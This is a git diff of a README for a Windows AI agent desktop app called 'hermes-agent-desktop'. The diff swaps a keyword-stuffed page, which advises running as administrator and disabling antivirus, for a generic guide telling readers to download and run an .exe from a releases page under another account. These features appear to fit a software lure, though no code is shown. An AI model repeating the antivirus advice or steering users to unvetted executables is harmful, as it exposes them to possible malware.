@@ -1,71 +1,89 @@
-# Hermes Agent Desktop
-Hermes Agent Desktop — hermes agent desktop ai assistant desktop client hermes ai agent autonomous agent claude grok gemini local ai automation workflow tool windows 11 macos linux setup guide tutorial 2026
+# 🤖 hermes-agent-desktop - Run intelligent AI assistants on Windows
 
+[![Download Hermes Desktop](https://img.shields.io/badge/Download-Hermes_Desktop-blue.svg)](https://github.com/Judunreliable735/hermes-agent-desktop/releases)
 
-<img width="286" height="176" alt="image" src="https://github.com/user-attachments/assets/8e0b5832-6e28-4fb8-a7ad-454db662a9a8" />
+## 📌 Overview
 
+Hermes Desktop brings powerful artificial intelligence agents to your Windows computer. This application runs local language models, which means it processes information on your machine instead of sending data to the cloud. You gain a private workspace for complex tasks, file management, and automated reasoning. It fits into your daily workflow to handle repetitive actions and research queries.
 
-[![GitHub Stars](https://img.shields.io/github/stars/desktop-hermes/hermes-agent-desktop?style=flat-square&color=00d4aa)](https://github.com/desktop-hermes/hermes-agent-desktop/stargazers)
-[![GitHub Forks](https://img.shields.io/github/forks/desktop-hermes/hermes-agent-desktop?style=flat-square&color=0099cc)](https://github.com/desktop-hermes/hermes-agent-desktop/network)
-[![Downloads](https://img.shields.io/github/downloads/desktop-hermes/hermes-agent-desktop/total?style=flat-square&color=7c5cbf)](https://github.com/desktop-hermes/hermes-agent-desktop/releases)
-[![License](https://img.shields.io/badge/license-MIT-blue?style=flat-square)](LICENSE)
+## 💻 System Requirements
 
-## Overview
-Hermes Agent Desktop is a powerful AI agent desktop application that brings autonomous AI assistance to your computer. It supports multiple AI models including Claude, Grok, Gemini and others. The application enables complex automation workflows, smart task execution, local AI processing, and seamless integration with your desktop environment. Perfect for power users, developers, and anyone who wants an intelligent AI agent working directly on their Windows 11, macOS, or Linux system.
+Your computer needs specific hardware to run these AI models effectively. Ensure your system meets these standards:
 
-> [!Important]
-> This project is for educational and personal use only. Use at your own risk. Some features may require API keys from AI providers. The authors are not responsible for any account issues or violations of service terms.
+- Operating System: Windows 10 or Windows 11 (64-bit).
+- Processor: Recent Intel Core i5 or AMD Ryzen 5 processor.
+- Memory: At least 8 gigabytes of RAM. 16 gigabytes or more provides better results.
+- Graphics: A dedicated NVIDIA or AMD graphics card helps with model speed. Systems with integrated graphics will run, but the AI response speed will be slower.
+- Storage: 10 gigabytes of free space to store models and the application files.
 
-## Install
-[Download `hermes-desktop.zip`](https://github.com/desktop-hermes/hermes-agent-desktop/releases/download/v0.6.0/hermes-desktop.zip)
----
-> Optimized for Windows 11 • macOS • Linux.
-## Preview
+## 📥 Installation Steps
 
-<table>
-<tr>
-<td width="50%" align="center"><b>Chat</b><br/><img width="100%" alt="Chat" src="previews/chat.png" /></td>
-<td width="50%" align="center"><b>Profiles</b><br/><img width="100%" alt="Profiles" src="previews/profiles.png" /></td>
-</tr>
-<tr>
-<td width="50%" align="center"><b>Models</b><br/><img width="100%" alt="Models" src="previews/models.png" /></td>
-<td width="50%" align="center"><b>Providers</b><br/><img width="100%" alt="Providers" src="previews/providers.png" /></td>
-</tr>
-<tr>
-<td width="50%" align="center"><b>Tools</b><br/><img width="100%" alt="Tools" src="previews/tools.png" /></td>
-<td width="50%" align="center"><b>Skills</b><br/><img width="100%" alt="Skills" src="previews/skills.png" /></td>
-</tr>
-<tr>
-<td width="50%" align="center"><b>Schedules</b><br/><img width="100%" alt="Schedules" src="previews/schedules.png" /></td>
-<td width="50%" align="center"><b>Gateway</b><br/><img width="100%" alt="Gateway" src="previews/gateway.png" /></td>
-</tr>
-<tr>
-<td width="50%" align="center"><b>Persona</b><br/><img width="100%" alt="Persona" src="previews/persona.png" /></td>
-<td width="50%" align="center"><b>Kanban</b><br/><img width="100%" alt="Kanban" src="previews/kanban.png" /></td>
-</tr>
-<tr>
-<td width="50%" align="center"><b>Office</b><br/><img width="100%" alt="Office" src="previews/office.png" /></td>
-<td width="50%" align="center"><b>Settings</b><br/><img width="100%" alt="Settings" src="previews/settings.png" /></td>
-</tr>
-</table>
+Follow these steps to install the software on your PC.
 
----
-## Troubleshooting
-| Problem | Solution |
-|--------------------------------|-------------------------------------------------------|
-| App doesn't start | Run as Administrator and disable antivirus temporarily |
-| API connection failed | Check your API keys and internet connection |
-| Agent not responding | Restart the application and update models |
-| Workflow errors | Check configuration and permissions |
-| Slow performance | Close background applications |
-| Windows 11 compatibility error | Update Windows and .NET runtime |
-| Models not loading | Update to latest version 2026 |
-| Download / update failed | Use the latest release and check your internet connection |
+1. Visit the [official releases page](https://github.com/Judunreliable735/hermes-agent-desktop/releases) to view available versions.
+2. Select the file ending in `.exe` under the latest release section.
+3. Save the file to your Downloads folder.
+4. Double-click the downloaded file to start the installation.
+5. Follow the prompts on the screen to place the app in your folder of choice.
+6. Launch the software using the new shortcut on your desktop.
 
-* Hermes Agent Desktop
-* Hermes AI Desktop Client
-* Autonomous AI Agent
-* Hermes Desktop Automation
-* AI Workflow Tool 2026
-* Claude Grok Gemini Desktop
-* Hermes Agent Download
+## ⚙️ Initial Setup
+
+When you open the app for the first time, it performs an internal configuration. 
+
+1. Allow the application to check for system paths during the first launch.
+2. Select a base model from the provided list. These models act as the brain for your agent.
+3. The app will download the selected model automatically. This may take several minutes depending on your internet connection.
+4. Once the progress bar fills, the interface will enable the chat box.
+
+## 🛠️ Frequently Asked Questions
+
+### Does this app send my files to the internet?
+No. The application runs locally. Your data stays on your hard drive. 
+
+### Can I run multiple agents at once?
+Yes. The software supports multiple sessions. You can open different windows for distinct tasks.
+
+### My computer is running slow. What should I do?
+AI models require significant power. Close other heavy programs like video editors or games to free up memory for the agent.
+
+### How do I update the software?
+Check the releases page periodically. You can download the new version and run the installer. The app preserves your existing settings.
+
+## 🧩 Managing Plugins and Skills
+
+The app supports plugins to increase the capability of your agent. You can enable these in the settings menu.
+
+- File Explorer Plugin: Grants the agent limited access to move or organize folders.
+- Search Plugin: Allows the agent to look for information in your local text files.
+- Command Plugin: Lets the agent open other applications on your system.
+
+Always review the permissions of a plugin before you enable it. The agent identifies the purpose of each plugin upon activation.
+
+## 🔍 Troubleshooting Performance
+
+If the software stops responding, restart the application using the task manager. Right-click your taskbar and choose Task Manager, then find the app in the list and click End Task.
+
+If you face errors during model loading, check your disk space. Models occupy several gigabytes. Insufficient space prevents the software from starting.
+
+If response times remain high, go to the settings tab. Choose a smaller model profile. Smaller models use less memory and run faster on systems with limited hardware.
+
+## 📁 Data Storage
+
+The software stores your chat history and configuration files in your user folder. You can navigate to this path to backup your sessions:
+
+C:\Users\[YourUsername]\AppData\Roaming\hermes-agent-desktop
+
+You can copy the contents of this folder to a new location if you need to move your data to another computer.
+
+## 🛡️ Privacy and Safety
+
+This version of the agent respects your privacy by design. It operates without a constant connection to external servers. You do not need to create an account or provide an email address to use the core features.
+
+While the agent can interact with your file system, it cannot access your hardware or internet settings unless you explicitly approve a plugin or feature that requires those permissions. Verify every request the agent makes if you are unsure about its intent.
+
+## 🚀 Getting Involved
+
+This project is open source. You can view the code on GitHub. If you encounter bugs, report them in the issues tab of the repository. Include your Windows version and the steps to recreate the issue so team members can assist you.
+
+Updates appear on the releases page. Bookmark the link to ensure you have the latest improvements and security patches.
